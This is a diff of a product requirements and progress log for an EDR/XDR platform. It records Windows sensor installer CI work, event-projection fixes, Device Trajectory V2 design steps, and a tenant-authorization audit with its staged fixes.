@@ -1,4006 +1,4080 @@
-# NivXRay — Master Reminders + Product Requirements
+# NivXForge EDR / NivXRay XDR — PRD
 
-**Authoritative execution baseline (locked 2026-08-29).**
+## Problem statement
+Evolve NivXForge EDR into a production-ready Enterprise SPA: promote the
+Phase 0 Windows Canonical Bridge to production (backend + XDR/EDR consoles),
+bootstrap the NivX Machines validation tenant, ship a true Windows Installer
+(EXE) built by GitHub Actions, and enrol the first real Windows endpoint to
+prove live Sysmon telemetry canonicalization and Device Trajectory.
+
+## Architecture
+- Frontend: React SPAs — NivXRay (XDR), NivXForge (EDR).
+- Backend: FastAPI + MongoDB. All routes under `/api`.
+- Sensors: Python — `agents/nivxforge-linux/`, `agents/nivxforge-windows/`.
+- Windows artifact: GitHub Actions `windows-latest`,
+  `.github/workflows/windows-sensor-installer.yml` → `NivXForgeEDRSetup.exe`.
+- Invariants: strict tenant/role authority, fail-closed secrets, immutable
+  canonical evidence, no fallback tenant, no preview/localhost endpoints.
+
+## Implemented
+- Phase 0 Windows Canonical Bridge promoted to production (backend, XDR, EDR).
+- NivX Machines internal-validation tenant reused: `ten_e759b7288598bd882e3dcac49d`.
+- Windows Installer V1 CI workflow + build script (unsigned internal build).
+- Enrolment token `tok_9cca5b436ad2400d` minted; endpoint enrolled:
+  `ep_1989031c8c1d0085812f` (identity intact, no re-enrolment needed).
+- Stage-4 `sc.exe` syntax fix + idempotent resume path (commit `ad4a58ef`).
+- **2026-06 · Stage-4 SCM runtime fix (commit `56a4d130`, LOCAL — needs
+  "Save to Github")**: `--service-run` dispatched from raw argv before any
+  argparse; real `ServiceFramework` + `StartServiceCtrlDispatcher` with
+  START_PENDING→RUNNING, STOP/SHUTDOWN, clean STOPPED; service host switched
+  from one-file to a **onedir payload** inside the one-file installer;
+  `service.log` diagnostics; CI acceptance gates (stage-host, SCM argv
+  recognition, real create→start→RUNNING→stop→STOPPED→delete lifecycle).
+  See `memory/production-gates/WINDOWS_INSTALLER_STAGE4_SCM_RUNTIME_FIX.md`.
+
+- **2026-06 · Post-push verification (read-only)**: pushed as `3700d3f3`
+  (platform bookkeeping commit on top of `56a4d130`; installer files byte
+  identical remote-vs-local). Run **36296416653** SUCCESS on windows-latest:
+  all four gates green including the real SCM lifecycle
+  CREATE→START→RUNNING→STOP→STOPPED→DELETE. Artifact
+  `NivXForgeEDRSetup-windows-x64` id 10924240416 (17,932,393 B zip).
+  Job logs (403) and artifact bytes (401) need repo-admin auth, so the EXE
+  SHA-256 and `sc qc` text are NOT independently obtained. See
+  `memory/production-gates/WINDOWS_INSTALLER_STAGE4_POST_PUSH_VERIFICATION.md`.
+
+## Backlog
+- P0: **Windows activity projection fix implemented (commit `86e02057`,
+  LOCAL, not pushed, not deployed)** — one resolver
+  `windows_eventlog.envelope_activity` + `flat_view` + facet/filter
+  predicates generated from `SUPPORTED`; consumers updated:
+  `edr_events._row`, activity facet, activity filter, `edr.py`
+  detections + process/trajectory surface, `response.py` targeting.
+  Second mismatch found and fixed: canonical `AUTHENTICATION` vs the
+  console vocabulary `AUTH` (projection alias, both names in the row
+  basis). 41 new tests; `tests/edr` 673 passed. Report:
+  `memory/production-gates/WINDOWS_ACTIVITY_PROJECTION_FIX.md`.
+  Awaiting owner review → Save to Github → backend republish only (no
+  migration, no backfill).
+- P1 (recorded, deliberately out of that patch): Windows derivations
+  report `parser_name=nivxforge-linux-sensor`; sensor `<Events>`
+  batch-wrapper defect (~1 record per 100 refused as malformed XML);
+  sensor `_attr()` cannot read single-quoted attributes; broader Windows
+  event-family coverage (5379, 4798, 4648, 4672); store the canonical
+  activity class on the derivation at ingest.
+- P0: **Windows canonicalization gap — diagnosis DONE, patch NOT applied.**
+  Canonical bridge works (Sysmon 1 → PROCESS, observation
+  `kind=process_create`, detection evaluated). First broken boundary is the
+  PROJECTION layer: `edr_events._row` (line 126), the activity facet
+  (322-326), the activity filter (233), `edr.py` 494/568 and
+  `response.py` 94 all read the Linux dialect `payload["activity"]`, which
+  a `WINDOWS_EVENT_LOG` envelope does not have. Secondary sensor defects:
+  `<Events>` wrapper corrupts ~1 record per 100-record batch; `_attr()`
+  cannot read single-quoted attributes. Full A–F report:
+  `memory/production-gates/WINDOWS_PHASE0_CANONICALIZATION_GAP_DIAGNOSTIC.md`.
+  Awaiting owner approve/reject of the minimal patch.
+- P0: owner PASS/HOLD on the artifact, then endpoint repair instructions.
+- P1: close evidence-access gaps — read-only GitHub PAT (logs + artifact
+  hash), and make `service.log` presence a hard CI assertion.
+- P0: live Windows canonicalization proof (endpoint online, Sysmon ingested,
+  canonical evidence + Device Trajectory).
+- P1: full investigation surface (Hunt, Files, Network, Forensics, Live Query).
+- P1: EDR UI parity matrix (Cisco AMP-style UX).
+- P2: `test_edr_and_xdr_resolve_the_same_authority` harness debt (`oracle=`).
+- P2: Gate 12 mobile responsive refactor (`nivxforge.css`).
+- P2 deferred: DPAPI/TPM credential hardening, tenant-creation unique index,
+  Windows sensor outbox cap/rotation.
+
+## Known issues
+- `test_sensor_runtime_state_is_never_committed` flakes under the parallel
+  full suite (git invocation); passes in isolation.
+
+## 2026-06 · Push gate status (owner-approved, Option A)
+- Owner approved CI-only commit `d03d8523` AS PRESENTED. Decision: INCLUDE
+  both intermittent tests (`test_sensor_runtime_state_is_never_committed`,
+  `test_production_launcher_refuses_admin_credential_bootstrap`). NO
+  exclusions added for them — verified: workflow has no `-k`/`--deselect`
+  naming either test.
+- `86e02057` (projection patch) left byte-identical. patch-id
+  `0479b1adb6b28e76b44b7c6927e923fbd5a002a5`; full `git show` sha256
+  `8c8e72bdcee0535b0a7028ad6d3a1782e3abe9bad25e59a7de646bd0aea4880f`.
+- Local branch `feature/rc2-alignment`; order preserved:
+  `86e02057` → (report commit) → `d03d8523` = HEAD.
+- Zero edits made this turn. Awaiting owner "Save to GitHub", then
+  authoritative CI observation. On first failure of either intermittent
+  test: capture evidence, NO rerun, NO exclusion, STOP for owner review.
+- Republish remains BLOCKED pending owner review of CI evidence.
+
+## 2026-06 · FIRST CI FAILURE — STOP (read-only triage, nothing changed)
+- RC4.x Quality Gate RED on push + pull_request. HOLD on republish.
+- Classified: (A) CI env — `JWT_SECRET`/`EMERGENT_LLM_KEY` absent on runner,
+  `deps.validate_config()` fail-closed → durable-findings/f4/f3/gate3;
+  (B) CI data-seed — `resolve_tenant_scope` reads `users` collection, empty
+  mongo:7 → f13_5 403; (C) harness leakage — `mod.subprocess.run = fake_run`
+  mutates the stdlib `subprocess` singleton for the whole xdist worker,
+  poisoning the two owner-protected tests; (D) NO projection defect, 41/41 pass.
+- Full evidence: memory/production-gates/RC4X_CI_FIRST_FAILURE_TRIAGE.md
+- Remediation PROPOSED only, awaiting owner approval. No reruns, no exclusions.
+
+## 2026-06 · CI hermeticity hardening — local commit 3aadd519, NOT PUSHED
+- One commit: scoped installer `subprocess.run` fake via monkeypatch (+ new
+  `tests/edr/test_edr_suite_hermeticity.py` guard), explicit CI-only config in
+  the workflow step (`JWT_SECRET`, `EMERGENT_LLM_KEY`, `ADMIN_*`,
+  `NIVX_AI_ENABLED=false`), self-seeding `principal` fixture for
+  `test_p0_f13_5` + two 403 negative controls.
+- Proofs A–J with `backend/.env` absent (git worktree) and empty Mongo:
+  602 passed / 0 failed / 0 errors twice; 41/41 projection; both previously
+  contaminated tests pass in both orders and under `-n 2 --dist loadscope`.
+- `86e02057` still byte-identical. No app code, no deploy, no CI re-run.
+- Evidence: memory/production-gates/RC4X_CI_HERMETICITY_PREPUSH_PROOF.md
+- Marker-based test classification proposed only:
+  memory/production-gates/RC4X_TEST_MARKER_PROPOSAL.md
+- AWAITING OWNER REVIEW before push. Republish still on HOLD.
+
+## 2026-06 · RC4.x CI GREEN on the authoritative runner (read-only verified)
+- Remote `jpreddy017/nivxray-xdr` @ `feature/rc2-alignment`, HEAD `8c53c002`.
+- RC4.x Quality Gate SUCCESS on push (run 36308919817) and pull_request
+  (36308923628); step "Unit tests — EDR plane (deterministic scope)" green in
+  both, with no `continue-on-error`/`|| true` ⇒ 0 failures, 0 errors.
+- Commit order intact: `86e02057` → `d03d8523` → `3aadd519`; `86e02057`
+  resolves on the remote unchanged (5 files, +679 −11).
+- Remote workflow + all 7 relevant test files hash-match local.
+- Literal pytest count lines NOT retrievable read-only (log download needs
+  admin; no PAT used) — documented as a limitation.
+- `Vercel – nivxray-xdr` red = legacy root project, OUT OF SCOPE;
+  `nivxray-xdr-production` and `nivxray-edr-production` are green.
+- Evidence: memory/production-gates/RC4X_CI_ACCEPTANCE_RECORD.md
+- PRODUCTION REPUBLISH STILL ON HOLD pending owner approval. After republish:
+  verify 4624→AUTH, Sysmon 1→PROCESS, facets populated, PROCESS filter
+  returns processes, Device Trajectory shows real process evidence.
+
+## 2026-06 · Backend republish APPROVED by owner — blocked on the owner's click
+- Pre-publish safety gate re-verified read-only: no frontend file, no .env /
+  requirements, no new env reads in production code, no schema/index/migration/
+  backfill, collection policy and the 8 SUPPORTED families unchanged, response
+  authority fail-closed unchanged, sensor untouched.
+- Production BEFORE baseline: /api/health ok, openapi 862 paths
+  sha256 8c04168feebf43f0 (still the pre-projection build).
+- Platform constraint (unchanged): republish is an OWNER-ONLY click in the
+  Emergent UI; the agent cannot trigger it and it cannot be scoped
+  backend-only (frontend diff is empty, so the rebuild is a frontend no-op).
+- Acceptance script ready: memory/production-gates/prod_projection_verify.sh
+  (read-only GETs; needs a console bearer token the owner pastes into their own
+  shell). Gate doc: WINDOWS_PROJECTION_BACKEND_REPUBLISH.md
+- Defect closes only when facets AUTH/PROCESS > 0, per-record 4624→AUTH and
+  Sysmon 1→PROCESS, PROCESS filter returns real records, unsupported families
+  stay explicit gaps, tenant isolation holds, and Device Trajectory resolves
+  real canonical process evidence.
+
+## 2026-06 · CORRECTION + production acceptance harness
+- Publish 100 (`d85f369`) IS already live. The earlier "production is still
+  pre-projection" claim was WRONG: preview (patched) serves the same OpenAPI
+  hash `8c04168feebf43f0` / 862 paths, because the patch adds no route.
+- Valid build fingerprint instead: `GET /api/edr/events?activity=AUTHENTICATION`
+  → pre-patch 422 ACTIVITY_INVALID (edr_events.py:227-231 @ 86e02057^) vs
+  patched 200 with `filters_applied.activity == "AUTH"`. Confirmed on preview,
+  and `activity=BOGUS` still 422 (validation intact).
+- Owner-run acceptance script: memory/production-gates/prod_projection_verify.py
+  (getpass, one login POST, GETs only, PASS/FAIL per criterion). Agent cannot
+  run it: admin password is owner-held and no token may enter chat.
+- Supervisor health-check finding = false positive, untouched. SQLite/WAL repo
+  hygiene deferred.
+
+## 2026-06 · Production gate recorded: S1-S5 PASSED · S6 HELD
+- Owner will not accept Device Trajectory as final. New workstream:
+  DEVICE TRAJECTORY V2 — operational (not visual) parity with Cisco Secure
+  Endpoint-class investigation. No Cisco assets/CSS/code/branding.
+- PHASE A COMPLETE (read-only, no code change):
+  memory/production-gates/DEVICE_TRAJECTORY_V2_GAP_ANALYSIS.md
+- Findings in brief: V1 already has windowed cursor paging, endpoint-wide
+  lineage-ordered axis, lifelines, parent→child connectors, 30-day + 24-hour
+  navigator with drag handles, filters, pivots, and a focus handoff endpoint.
+  Real gaps: no Events→Trajectory entry point (EdrEventsPage has zero
+  trajectory links); no first-class relationships[]/detections[]/density[]/
+  coverage[] in the contract; no search match navigation; no RAW evidence tab
+  (though GET /api/edr/events/{raw_id} exists); no keyboard ops; inspector
+  fixed at 348px; URL uses replace so Back does not step; no request abort.
+- Telemetry-limited (NOT UI bugs): no Sysmon 5 process end, no signer/
+  integrity, 4688 lacks ProcessGuid+hashes, no file-read/module/WMI coverage.
+- Per-dimension parity: UI PARTIAL · NAV PARTIAL · TIMELINE GOOD ·
+  RELATIONSHIP PARTIAL · SEARCH/FILTER PARTIAL · EVIDENCE PARTIAL ·
+  TELEMETRY COVERAGE HONEST/NARROW. No aggregate score, by owner rule.
+- NEXT: await owner approval, then Phase B architecture doc. No code yet.
+
+## 2026-06 · PHASE B COMPLETE (design only) — Device Trajectory V2
+- memory/production-gates/DEVICE_TRAJECTORY_V2_ARCHITECTURE.md (61 sections,
+  flowcharts A-R, component diagram, contract, parity matrix, DT2-0..DT2-9,
+  rollback, risks, open decisions, 35-answer exit gate).
+- Decision: extend V1, replace nothing (REPLACE: none). Add 4 first-class
+  contract objects: relationships[], detections[], density[], coverage[] —
+  additive keys, V1 clients unaffected.
+- Coverage truth is 7-state with an UNKNOWN-first rule; fabricated
+  NOT_COLLECTED intervals forbidden.
+- PUSH/REPLACE history rules defined (fixes V1 indiscriminate replace:true).
+- Perf harness saved: memory/production-gates/dt2_perf_baseline.py.
+  BASELINE NOT YET CAPTURED — prod needs owner token; preview pod services were
+  restarting (~25s uptime) so local numbers would be noise. Substrate found:
+  test_database has 236,444 observations, device dev_42e8c6dc74b9 = 232,379.
+- NO code/deploy/DB write/sensor/response change. Awaiting approval for DT2-0.
+
+## 2026-06 · DT2-0 IMPLEMENTED (local commit 114e06d6, NOT pushed/deployed)
+- New package backend/edr_plane/trajectory/{models,contract}.py: 13 typed
+  contract objects with constructor-time validation. Evidence-backed
+  relationships only (FORBIDDEN_BASES rejects temporal proximity etc.),
+  7-state coverage with UNKNOWN-first + proof requirement, density with no
+  severity field, process identity authority AUTHORITATIVE/DERIVED/UNSTABLE,
+  no invented process end, focus with 4 explicit states (no silent fallback).
+- Owner decisions implemented: retention truth (4 separate range fields),
+  UNATTRIBUTED artifacts kept, 4624 without binding gets no process edge,
+  inspector width per-session (nothing persisted), DETECTION→PROCESS only when
+  authoritative.
+- Wiring: GET /api/edr/endpoints/{id}/trajectory gains ADDITIVE `dt2` key +
+  optional `raw_event_id` focus param; V2 failure degrades to
+  dt2.state=DT2_CONTRACT_UNAVAILABLE and never breaks V1.
+- Tests: 45 new (A–AI list) + 148 focused regression green; ruff clean.
+- Live read-only preview check on a 232,379-observation device: V1 keys intact,
+  42 edges all with evidence+basis, focus FOCUS_RESOLVED, cross-tenant 403.
+- Reports: DEVICE_TRAJECTORY_V2_DT2_0_IMPLEMENTATION.md and
+  DEVICE_TRAJECTORY_V2_PUBLIC_REFERENCE_ADDENDUM.md.
+- No deploy, no DB write/migration, no sensor, no canonicalization/detection
+  semantics, no response authority. DT2-1 NOT started. Awaiting owner approval.
+
+## 2026-06 · DT2-0 ACCEPTED by owner · DT2-1 AUTHORIZED but CI-BLOCKED
+- Owner accepted DT2-0 (commit `114e06d6`) subject to the authoritative
+  GitHub CI gate. DT2-1 (timeline/navigation/interaction engine) authorized
+  for that slice ONLY. DT2-2+ forbidden.
+- Owner decisions for DT2-1: (1) push only via owner "Save to Github" after
+  agent diff inspection — agent must not push; (2) **DT2-1 implementation is
+  BLOCKED until authoritative CI is GREEN for `114e06d6`; local pytest is NOT
+  a substitute**; (3) mouse/trackpad acceptance = synthetic WheelEvent
+  simulation only, report "PHYSICAL HARDWARE UX VALIDATION: NOT PERFORMED",
+  owner does physical acceptance; (4) frontend scope = minimum safe substrate
+  (navigation/interaction engine + bounded windowed rendering, KEEP the
+  existing lane/node renderer, no virtualization rewrite — STOP and report if
+  a measured blocker forces expansion); (5) layered test harness — frontend
+  unit/interaction (existing JS runner) + backend pytest (contract/tenant/
+  cursor/focus/V1) + focused Playwright (deltaMode, gestures, anchored zoom,
+  scroll-domain isolation, URL PUSH/REPLACE, Back/Forward, A→B→C stale
+  rejection, inspector-vs-trajectory scroll). All 50 required cases must be
+  mapped UNIT / PLAYWRIGHT / PYTEST / MANUAL-HARDWARE; no case passes on
+  design description alone.
+- **Commit inspection DONE (this turn, read-only):**
+  `memory/production-gates/DT2_0_COMMIT_INSPECTION_RECORD.md` — `114e06d6` =
+  5 files, +1387/−0, approved scope only, zero secrets, zero runtime
+  artifacts (no sqlite/wal/shm/log/env), no frontend/CI/deps/sensor/env/
+  supervisor change, no migration, `edr.py` change is 3 additive edits with
+  V2 inside try/except after all V1 keys are written. patch-id
+  `7a23172106bba1cdc543bfebb5d1192ec2df87c5`, `git show` sha256
+  `6e7a29c34ad4e5522f111122361ea16bdb5ec9231973c65b88487ec577978b2a`.
+  Verified the DT2-0 suite is NOT in the workflow's 10 `--ignore` entries and
+  is hermetic ⇒ CI will really execute it.
+- No `origin`/upstream exists in this pod, so the agent structurally cannot
+  push. Owner "Save to Github" is the only path.
+- Open hygiene item for the owner before the click: untracked
+  `memory/availability_probe.log` (44 KB, secret-clean, regenerable) would be
+  swept into the auto-commit — recommend deleting it first. Tracked
+  SQLite/WAL/SHM files are unmodified, so they cannot be swept in.
+- STOPPED. Awaiting: Save to Github → GREEN authoritative CI for `114e06d6`
+  → then DT2-1 implementation begins.
+
+## 2026-06 · Pre-GitHub housekeeping DONE — tree clean, ready for the click
+- Owner-approved deletion of the single untracked runtime artifact
+  `memory/availability_probe.log` executed. No commit made for the deletion
+  (the file was untracked). Generator `memory/availability_probe.sh` remains
+  tracked and intact.
+- `git status --short` is **empty**: nothing staged, zero tracked
+  modifications, zero untracked files, no SQLite/WAL/SHM/log/env pending.
+- Publish chain: `f1dcb454` → `114e06d6` (DT2-0 code) → `736c91b0` (DT2-0
+  report) → `521f9e1d` (platform auto-commit of the inspection record, PRD +
+  `DT2_0_COMMIT_INSPECTION_RECORD.md`, **memory/ docs only, zero code**).
+- HEAD is now `521f9e1d`, NOT `736c91b0` as the owner expected — the platform
+  auto-committed the previous turn's report. Both `114e06d6` and `736c91b0`
+  are verified ancestors of HEAD, so the CI checkout contains DT2-0, which
+  satisfies the owner's stated requirement.
+- `114e06d6` re-verified byte-identical: sha256
+  `6e7a29c34ad4e5522f111122361ea16bdb5ec9231973c65b88487ec577978b2a`,
+  patch-id `7a23172106bba1cdc543bfebb5d1192ec2df87c5`.
+- Tracked SQLite/WAL/SHM hygiene debt deliberately NOT touched — separate
+  debt, kept out of the DT2 chain per owner agreement.
+- DT2-1 still BLOCKED on GREEN authoritative CI. Nothing deployed.
+
+## 2026-06 · DT2-2C TEMPORAL / CAUSAL SEQUENCE PRIMITIVE DONE (server-side only)
+- New `backend/edr_plane/trajectory/sequence.py`. Separation kept explicit:
+  `relationships.py` = WHAT is related (evidence); `sequence.py` = HOW proven
+  relationships are ordered and WHAT causality level may be claimed.
+- `StepTimes` keeps source/ingest/canonicalization/detection as four distinct
+  fields; ordering uses source/observed time ONLY, never backfilled.
+- `SequenceStep` can only reference an existing `ProcessEdge`/`ActivityEdge`.
+  Levels: CAUSAL_EVIDENCE (spawn child IS next actor, carries the edge's own
+  derivation basis + evidence_ref + predecessor id), ORDERED_OBSERVATION
+  (same proven actor), CAUSALITY_UNKNOWN (no link, or not orderable).
+- Grouping is by proven process identity only, so unrelated observations 1 ms
+  apart land in separate sequences. Forbidden bases rejected at construction.
+- No behavioral/malicious classification, no ATT&CK, no scoring, no UI, no
+  DT2-1/canonicalization/detection change, no DB/migration/deploy.
+- Tests: `backend/tests/edr/test_dt2_2c_sequence.py` (29) + DT2-2A/2B
+  regression → 83 passed.
+- NEXT: DT2-2D behavioral relationship engine (must keep evidence vs
+  inference levels separate). P0 tenant authority hardening still pending.
+
+## 2026-06 · DT2-2D BEHAVIORAL RELATIONSHIP PRIMITIVE DONE (server-side only)
+- New `backend/edr_plane/trajectory/behavior.py`. Layering strictly one-way:
+  evidence → 2A ProcessEdge → 2B ActivityEdge → 2C TemporalSequence →
+  2D BehavioralRelationship. Behaviors reference step_ids and re-use the
+  steps' own evidence_refs; no edge/evidence/time is ever manufactured.
+- Truth levels: OBSERVED (one direct, GUID-proven evidence step),
+  DERIVED (>=2 steps joined by proven CAUSAL_EVIDENCE lineage),
+  CORRELATED (non-causal join or PID-surrogate identity — epistemic
+  strength only, NOT suspicion), INFERRED (defined, deliberately unused:
+  construction requires a named inference producer that does not exist).
+- Behavior types: PROCESS_CHAIN, EXECUTION_TO_DNS/NETWORK/FILE/REGISTRY.
+  Anything else rejected at construction; judgement-bearing provenance keys
+  (severity/score/verdict/mitre/beaconing/persistence/...) rejected too.
+- Tests: `backend/tests/edr/test_dt2_2d_behavior.py` (31) + 2A/2B/2C
+  regression → 114 passed.
+- NEXT: multi-step behavior patterns (exec → DNS → network → file → child
+  exec) feeding both Device Trajectory and the Incident Behavior Tree.
+  P0 tenant authority hardening still pending.
+
+## 2026-06 · DT2-2E TRAJECTORY GRAPH PROJECTION CONTRACT DONE (not wired)
+- New `backend/edr_plane/trajectory/projection.py` — pure COMPOSITION layer:
+  DT2-0 `contract.build` (identity, coverage, availability, ranges,
+  detections, focus) + 2A process_edges + 2B activity_edges + 2C
+  temporal_sequences + 2D behaviors → `TrajectoryGraph`. Owns no
+  relationship/coverage/behavior logic of its own.
+- Renders: ProcessNode (depth, lifeline as EVIDENCE SPAN with end_time
+  permanently None, presence OBSERVED vs REFERENCED_BY_CHILD_EVIDENCE_ONLY),
+  ActivityNode (DNS/NETWORK/FILE/REGISTRY attached to the proven actor),
+  GraphEdge (evidence_ref + WHY + basis + split times + causality level),
+  order/sequences, behaviors, detection_pivots, navigation (cursors,
+  before/after pivots that stay UNKNOWN), coverage re-exported verbatim.
+- Stable ids: `pnode:{iid}`, `anode:{iid}:{activity_id}`, DT2-2A/2B edge ids,
+  DT2-2C step ids; all focus targets validated through DT2-0 `FocusTarget`.
+- Tests: `backend/tests/edr/test_dt2_2e_projection.py` (32) + 2A/2B/2C/2D
+  regression → 146 passed. API route NOT wired (owner decision).
+- NEXT (owner-stated order): **P0 customer/tenant authority hardening —
+  remove the browser-authoritative `SELECT CUSTOMER` control and make tenant
+  resolution server-derived** BEFORE the visible AMP-class trajectory
+  implementation.
+
+## 2026-06 · P0 TENANT AUTHORITY — READ-ONLY AUDIT COMPLETE (verdict FAIL)
+- Artifact: `memory/production-gates/TENANT_AUTHORITY_AUDIT.md` (13 sections).
+  No code/UI/DB/deploy change; no probes run (owner deferred the live
+  cross-tenant matrix to a separate authorization, preview only).
+- Verdict FAIL. Two structural defects:
+  1. `edr_tenancy.edr_tenant()` validates the registry ONLY; principal
+     authorization (`edr_scope`) is an optional per-route call, and EIGHT
+     TENANT_SCOPED ops never call it — `/api/edr/detections`,
+     `/campaign-story`, `/file-trajectory`, `/fleet-spread-index`,
+     `/response/actions/{command_id}`, `/response/isolation-policy`,
+     `/wave0/raw-events/stats`, `/wave0/raw-events/replay-candidates`.
+     On those, a client-supplied `X-Tenant-Id` EXPANDS authorization.
+  2. No server auto-bind on `/api/edr/*`: a single-authorized-tenant
+     principal gets 403 TENANT_REQUIRED, so the browser must name the
+     customer → `CustomerPicker` ("◇ SELECT CUSTOMER") is rendered with NO
+     role condition and is non-functional for normal customers
+     (`/api/xdr/tenants` needs `tenants.read` = platform admin only).
+- Also found: tenant-existence enumeration oracle (TENANT_NOT_FOUND vs
+  TENANT_NOT_AUTHORIZED_FOR_PRINCIPAL), fail-open default
+  (`NIVX_TENANT_REGISTRY_ENFORCE` off ⇒ `"default"` compat tenant + arbitrary
+  tenant strings accepted), vendor/MSSP inferred from role names, R4 gate
+  tests cross-principal refusal on `/api/edr/endpoints` only.
+- Minimum fix plan recorded (fix 1 → test 3 → fix 2 → fix 4 → fix 5), then the
+  deferred probe matrix, then back to AMP-class trajectory (DT2-2F).
+
+## 2026-06 · P0 TENANT AUTHORITY — FIX 1 DONE (edr_tenant is now authorizing)
+- `routers/edr_tenancy.edr_tenant()` reworked: takes the verified principal
+  (`Depends(deps.get_current_user)`) and resolves
+  `session_context.authorize_requested_tenant(principal, X-Tenant-Id)` FIRST,
+  then `tenant_registry.authoritative(...)`. Stamps
+  `request.state.effective_tenant_id/tenant_resolution_basis`. No second
+  authorization model; `edr_scope()` calls all left in place (defense in depth).
+- Single-authorized-tenant principal is now AUTO-BOUND server-side (no header
+  needed); naming another tenant ⇒ TENANT_NOT_AUTHORIZED_FOR_PRINCIPAL;
+  cross/multi-tenant with no header ⇒ TENANT_REQUIRED; zero-tenant ⇒
+  TENANT_NOT_RESOLVED. Authorization runs before the registry lookup, so an
+  unheld tenant's existence is never confirmed.
+- All 8 G1 routes are structurally proven (live route-table introspection) to
+  depend on the fixed dependency, so the bypass is closed at the gate.
+- NEW FINDING (G1-B, NOT fixed — out of Fix 1 scope): a SECOND resolver
+  `routers/edr_enrollment._tenant()` is still registry-only and serves 7
+  TENANT_SCOPED ops (`/api/edr/enrollment/*`, `/api/edr/onboarding/computers*`).
+  Pinned in the test as `SECOND_RESOLVER_OPERATIONS` so the list can only shrink.
+- Tests: `backend/tests/edr/test_p0_tenant_authority_fix1.py` (23) → 23 passed.
+  No preview probes (owner deferred). SELECT CUSTOMER / UI untouched.
+- NEXT: owner review, then next tiny step (fix-plan items 2-6 still open:
+  non-disclosing refusal, R4 gate extension, UI switchability, enforcement
+  default, vendor/MSSP model) + G1-B.
+
+## 2026-06 · P0 TENANT AUTHORITY — FIX 1B DONE (duplicate resolver ELIMINATED)
+- `routers/edr_enrollment._tenant()` DELETED (not hardened — removed). Its 5
+  enrollment routes + the 2 onboarding routes in `routers/edr_onboarding.py`
+  now take `tenant_id/tenant: str = Depends(edr_tenant)`, so there is ONE
+  principal→tenant authority on the EDR plane.
+- The `users["customer"]` compat fallback is gone from this authorization path
+  (asserted absent from edr_enrollment, edr_onboarding and edr_tenancy).
+- SENSOR plane untouched: `_agent_tenant()` / `sensor_tenant()` still derive
+  tenant from the authenticated enrolment/agent credential and read no header
+  (asserted; live sensors keep polling /agent/session + /agent/policy 200).
+- `SECOND_RESOLVER_OPERATIONS` in the Fix 1 test is now `()` and the
+  route-table test requires EVERY TENANT_SCOPED /api/edr/* op to depend on
+  `edr_tenant` — 15 of 15.
+- Repaired two pre-existing B5 tests that called the deleted helper
+  (`tests/test_b4b5_tenant_registry_authority.py`), plus one latent TypeError
+  (`_agent_tenant` keyword-only `oracle`) that had been failing before.
+- Tests: fix1 suite 26 + B5 suite 30 + R4 (1 skipped, credential-gated) →
+  56 passed, 1 skipped. No preview probes. SELECT CUSTOMER / UI untouched.
+- STILL OPEN: fix-plan items 2-6 and the deferred preview cross-tenant probe
+  matrix. Tenant Authority is NOT declared closed.
+
+## 2026-06 · P0 TENANT AUTHORITY — FIX 2 DONE (non-disclosing tenant refusal)
+- `routers/edr_tenancy.py`: for a principal WITHOUT `tenants.read`, a REQUESTED
+  tenant that is unheld / unregistered / inactive now yields ONE byte-identical
+  403 (`TENANT_NOT_AUTHORIZED_FOR_PRINCIPAL` + `disclosure:
+  TENANT_EXISTENCE_AND_STATE_NOT_DISCLOSED`). Closes the enumeration oracle a
+  `soc_manager`/`mssp_operator` (all_tenants, no tenants.read) had.
+- Privilege is read from the EXISTING RBAC vocabulary
+  (`xdr_rbac._resolve_user_permissions` → granular, else built-in role
+  expansion); unresolvable privilege fails closed towards NON-disclosure.
+  Precise code survives in the server log + `_audit_scope_denial`.
+- NOT normalised (discloses nothing about another customer): `TENANT_REQUIRED`,
+  `TENANT_NOT_RESOLVED`, `ACCESS_DENIED`, and refusals about the principal's
+  OWN auto-bound tenant (e.g. own ARCHIVED tenant still says TENANT_NOT_ACTIVE).
+- Authorisation unchanged and still authorise-first; no grant path added.
+- Tests: new `tests/edr/test_p0_tenant_authority_fix2.py` (16) + fix1 suite
+  updated (28, incl. new f14b) + B5 (30) + R4 (skip) → 73 passed, 1 skipped.
+- STILL OPEN: fix-plan items 3-6 and the deferred preview cross-tenant probe
+  matrix. Tenant Authority is NOT closed.
+- RECORDED FOR LATER (owner): tenant authorization and PRODUCT ENTITLEMENT are
+  separate decisions — the Cisco-style "no EDR entitlement/licence" experience
+  comes later, after the cross-tenant boundary is proven.
+
+## 2026-06 · P0 TENANT AUTHORITY — FIX 3 LIVE R4 PROOF (1 pre-existing FAIL)
+- Extended `backend/tests/test_edr_route_tenant_authority.py` with CLAUSE 6:
+  the cross-tenant matrix now runs per-operation over ALL 60 TENANT_SCOPED
+  EDR ops (43 read + 17 mutating) in BOTH directions, using the two existing
+  preview customers (`nivx-live` via analyst@nivx-live.com, `default` via
+  analyst@default.com — both passwords env-supplied, never literals).
+- Live result: **660 passed, 43 skipped, 1 failed** in 8m25s. Preview only,
+  read-only; mutating ops driven for REFUSAL cases only (nothing created,
+  isolated, rotated or revoked).
+- PROVEN LIVE: own-tenant reached; auto-bind with NO header (Fix 1); A→B and
+  B→A refused with TENANT_NOT_AUTHORIZED_FOR_PRINCIPAL + fail_closed +
+  disclosure note on all 60 ops incl. the 8 G1 and 7 G1-B routes; unheld /
+  nonexistent / ARCHIVED indistinguishable (Fix 2 live); refusal bodies carry
+  no foreign data.
+- 43 SKIPPED = the zero-tenant cell. UNPROVEN LIVE: the only zero-tenant
+  preview user (`a05-notenant-…`) has no password hash. No account or
+  credential was created (owner decision). Hermetic proof stands (fix1 f10,
+  fix2 g09). Set TEST_ZERO_TENANT_EMAIL/PASSWORD to prove it live.
+- 1 FAILED — PRE-EXISTING, NOT PATCHED (owner instruction to stop and report):
+  `POST /api/edr/enrollment/tokens/{token_id}/revoke` is live but absent from
+  `ROUTE_CLASSIFICATION` (git -S confirms it was never classified), so the
+  fail-closed completeness clause rejects it. Verified it is NOT a bypass:
+  introspection shows it does depend on `edr_tenant` + `get_current_user`.
+  It is UNCLASSIFIED + UNTESTED authority, awaiting owner authorisation to
+  classify TENANT_SCOPED and add its refusal-only probe.
+- STILL OPEN: fix-plan items 4-6 (SELECT CUSTOMER / browser authority,
+  fail-open enforcement default + "default" residue, vendor-MSSP model).
+
+## 2026-06 · P0 TENANT AUTHORITY — FIX 3A DONE (classification + R4 probe)
+- `POST /api/edr/enrollment/tokens/{token_id}/revoke` added to
+  `ROUTE_CLASSIFICATION` as TENANT_SCOPED (coverage entry only; the route
+  already depended on `edr_tenant` + `get_current_user`, no authorization or
+  business change) and given a REFUSAL-ONLY probe in the R4 SAMPLES table
